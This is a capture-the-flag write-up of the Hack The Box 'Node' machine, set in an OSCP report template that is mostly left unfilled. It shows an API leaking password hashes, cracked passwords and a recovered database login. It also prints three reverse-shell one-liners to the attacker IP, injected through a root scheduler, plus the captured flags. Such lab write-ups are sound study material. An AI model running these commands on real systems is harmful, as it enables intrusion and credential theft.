---
title: "Offensive Security Certified Professional Exam Report"
author: ["your@mail.com", "OSID: XXXX"]
date: "2021-01-05"
subject: "Markdown"
keywords: [Markdown, Example]
subtitle: "Lab Report"
lang: "en"
titlepage: true,
titlepage-rule-color: "360049"
titlepage-rule-height: 2
titlepage-background: "res/background1.pdf"
book: true
classoption: oneside
code-block-font-size: \scriptsize
---
# Lab name Report

## Introduction

This report is about pentesting a specific machine to see if it's well secured. It will document every thought and interesting investigation that helped to get into privilege escalation.  

## Objective

Run an analysis onto a specific machine ...

## Perimeter

Only this machine 10.129.40.176 with specific tools

- nmap
- masscan
- nc

# High-Level Summary

## Mitre techniques

Initial Access:  

- N/A  

Execution:  

- N/A

Persistence:  

- N/A  

Privilege Escalation:  

- N/A

Defense Evasion:  

- N/A

Credential Access:  

- N/A

Discovery:  

- N/A

Lateral Movement:

- N/A

Collection:  

- N/A 

Command and Control:  

- N/A

Exfiltration:  

- N/A  

Impact:  

- N/A

## Recommendations

I recommend patching the vulnerabilities identified during the testing to ensure that an attacker cannot exploit these systems in the future.
One thing to remember is that these systems require frequent patching and once patched, should remain on a regular patch program to protect additional vulnerabilities that are discovered at a later date.  

Also, I recommend a better management of granted access for framework like perl to avoid root execution without password for any user.  

Check other recommendations at the end of this document. 

# Soluces

[ippsec video ](https://www.youtube.com/watch?v=sW10TlZF62w)  
[soluces from ](https://github.com/michoo/sec-learning/blob/master/soluces/1_Linux/node-writeup-w-o-metasploit.md)  
[soluces from Hack the box](https://github.com/michoo/sec-learning/blob/master/1_Linux/Node/soluce/Node.pdf)

# Methodologies

I used a widely adopted approach to performing penetration testing that is effective in testing how well the Offensive Security Exam environments is secured.
Below is a breakout of how I was able to identify and exploit the variety of systems and includes all individual vulnerabilities found.

## Reconnaissance

The information gathering portion of a penetration test focuses on identifying the scope of the penetration test.
During this penetration test, I was tasked with exploiting the shocker machine.

The specific IP addresse was:

**Scope**

- 10.129.40.176

My attacking ip machine was 10.10.14.2

## System IP: 10.129.40.176
### Enumeration

Lets do a nmap

```bash
mkdir nmap
sudo nmap -sC -sV -O -oA nmap/initial 10.129.40.176
    -sC: run default nmap scripts
    -sV: detect service version
    -O: detect OS
    -oA: output all formats and store in file nmap/initial

```
![results nmap](images/nmap.png)

#### TCP
Port 3000 open. It's default nodejs express port
Port 22 open (ssh)


#### Harvested Informations
- nodejs deserving also angular application
- express nodejs framework

#### Vuln Investigation

##### Check for exploits

### Penetration
After loading we can have an api resolved  
http://10.129.40.176:3000/api/users/latest

showing informations of last users with encrypted password

![results api latest](images/last-users.png)

So as it's an api lets try all users http://10.129.40.176:3000/api/users/  

![results api all?](images/all-users-Screenshot_2021-04-15_22-58-16.png)

```
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]

```


Nice we have admin username  myP14ceAdm1nAcc0uNT

Trying other urls   
http://10.129.40.176:3000/partials/admin.html
![results digging](images/javascript-digging4-Screenshot_2021-04-15_23-15-34.png)
-> no js loaded so no way to execute backup() function in source code



Trying to create a user with the api

```
curl --header "Content-Type: application/json" \
  --request POST \
  --data '{"username":"toto","password":"toto"}' \
  http://10.129.40.176:3000/api/users/toto
```
-> nope


After accessing http://10.129.40.176:3000/profiles/myP14ceAdm1nAcc0uNT (app.js)

Trying to push an image to check if I can push a reverseshell (broken auth)
```
curl \
  -F "_id=59a7365b98aa325cc03ee51c" \
  -F "image=@/home/kali/workspace/sec-learning/1_Linux/Node/images/nmap.png" \
  http://10.129.40.176:3000/uploads/
```
-> marche pas






Go back to the hash  

![Hash identifier](images/hash-identifier.png)

-> sha256  

Crack the hash
myP14ceAdm1nAcc0uNT/manchester
tom/spongebob
mark/snowflake
... please I' m not a robot


Manually it's possible to crack the hash with hashcat

```
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt
```


With admin password let's see

Download of backup

seem's to be a base64 encoded backup

```
cat myplace.backup| base64 -d > backup   
```

what kind of file it is?  
```
xxd backup | head  
```

![header](images/Screenshot_2021-04-16_01-01-55-backup-type-file.png)

https://en.wikipedia.org/wiki/List_of_file_signatures  

-> zip but it' s password protected

Cracking a zip (https://thehacktoday.com/how-to-crack-a-password-protected-zip-files-using-kali-linux/)

```
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup  

```
(sudo apt install fcrackzip && gzip -d /usr/share/wordlists/rockyou.txt.gz)
so the password is magicword

![crackzip](images/Screenshot_2021-04-16_01-15-39.png)

[Other technics](https://linuxconfig.org/how-to-crack-zip-password-on-kali-linux)

Inside app.js the mondodb connection is available with login/password

mark/5AYRft73VtFpc84k

![mark pass](images/Screenshot_2021-04-16_01-28-35-app.js.png)

So now let's try ssh with it and bingo

linenum

python -m SimpleHTTPServer 8000


/var/scheduler!!!! with root user

Connection to mongo 
```
mongo mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler

```

and add cmd

```
db.tasks.insert({"cmd": "sudo su && touch /home/mark/test.txt"});
db.tasks.insert({"cmd": "sudo usermod -a -G sudo mark"});
db.tasks.insert({"cmd": "sudo adduser mark sudo"})
db.tasks.find();

```
Let' s wait for 30sec


On attack machine
```bash
nc -lvnp 4444
```

then trying to forge reverse shell
db.tasks.insert({"cmd": "/bin/bash -i >& /dev/tcp/10.10.14.2/4444 0>&1"});
db.tasks.insert({"cmd": "nc -e /bin/sh 10.10.14.2 4444"});
db.tasks.insert({"cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f"});

Yeaaaheee!!! 

user.txt
e1156acc3574e04b06908ecf76be91b1

![user flag](images/Screenshot_2021-04-16_02-35-33-flag.png)

Using exploit:
 https://www.exploit-db.com/exploits/44298/

vi /tmp/exploit.c 
gcc exploit.c -o exploit


![root flag](images/Screenshot_2021-04-16_02-49-45-root.png)
root.txt
1722e99ca5f353b362556a62bd5e6be0

### Post exploitation

#### Host Information

#### File system

#### Running processes

#### Installed applications

#### Users & Group

#### Network

#### Scheduled job

### Privilege escalation

*Additional Priv Esc info*

**Vulnerability Exploited:**

**Vulnerability Explanation:**

**Vulnerability Fix:**

**Severity:**

**Exploit Code:**

### Goodies

#### Hashes

#### Passwords

#### Proof/Flags/Other

**Proof Screenshot Here:**

**Proof.txt Contents:**

## Maintaining Access

Maintaining access to a system is important to us as attackers, ensuring that we can get back into a system after it has been exploited is invaluable.
The maintaining access phase of the penetration test focuses on ensuring that once the focused attack has occurred (i.e. a buffer overflow), we have administrative access over the system again.
Many exploits may only be exploitable once and we may never be able to get back into a system after we have already performed the exploit.

## House Cleaning

The house cleaning portions of the assessment ensures that remnants of the penetration test are removed.
Often fragments of tools or user accounts are left on an organization's computer which can cause security issues down the road.
Ensuring that we are meticulous and no remnants of our penetration test are left over is important.

After collecting trophies from the exam network was completed, Alec removed all user accounts and passwords as well as the Meterpreter services installed on the system.
Offensive Security should not have to remove any user accounts or services from the system.

# Detailed Recommandations

## Technical

## Governance

## Blue team

# Additional Items

## Appendix - Proof and Local Contents

IP (Hostname) | Local.txt Contents | Proof.txt Contents
--------------|--------------------|-------------------
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here
192.168.x.x   | hash_here          | hash_here

## Appendix - Metasploit/Meterpreter Usage

For the exam, I used my Metasploit/Meterpreter allowance on the following machine: `192.168.x.x`

## Appendix - Completed Buffer Overflow Code

```
code here
```
